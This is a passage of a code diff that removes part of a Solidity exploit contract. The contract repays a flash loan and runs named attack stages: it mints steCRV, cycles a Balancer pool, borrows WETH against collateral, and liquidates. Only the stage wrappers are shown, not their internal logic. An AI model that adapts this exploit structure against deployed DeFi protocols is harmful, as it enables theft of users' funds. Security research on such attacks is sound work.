-        uint256 repayWeth = borrowedWeth + premiumWeth;
-
-        this.performExploitStages();
-        this.settleAndValidate(repayWstEth);
-        this.approveRepayment(repayWstEth, repayWeth);
-        return true;
-    }
-
-    function performExploitStages() external {
-        require(msg.sender == address(this), "only-self");
-        this.mintSteCrvSeedStage();
-        this.joinBalancerPoolStage();
-        this.depositCollateralAndBorrowStage();
-        this.exitBalancerPoolStage();
-        this.withdrawSteCrvAndLiquidateStage();
-        this.removeRecoveredBptLiquidityStage();
-    }
-
-    function mintSteCrvSeedStage() external {
-        require(msg.sender == address(this), "only-self");
-        _mintSteCrvSeed();
-    }
-
-    function joinBalancerPoolStage() external {
-        require(msg.sender == address(this), "only-self");
-        _joinBalancerPool();
-    }
-
-    function depositCollateralAndBorrowStage() external {
-        require(msg.sender == address(this), "only-self");
-        _depositCollateralAndBorrowWeth();
-    }
-
-    function exitBalancerPoolStage() external {
-        require(msg.sender == address(this), "only-self");
-        _exitBalancerPoolAndDisableSteCrv();
-    }
-
-    function withdrawSteCrvAndLiquidateStage() external {
-        require(msg.sender == address(this), "only-self");
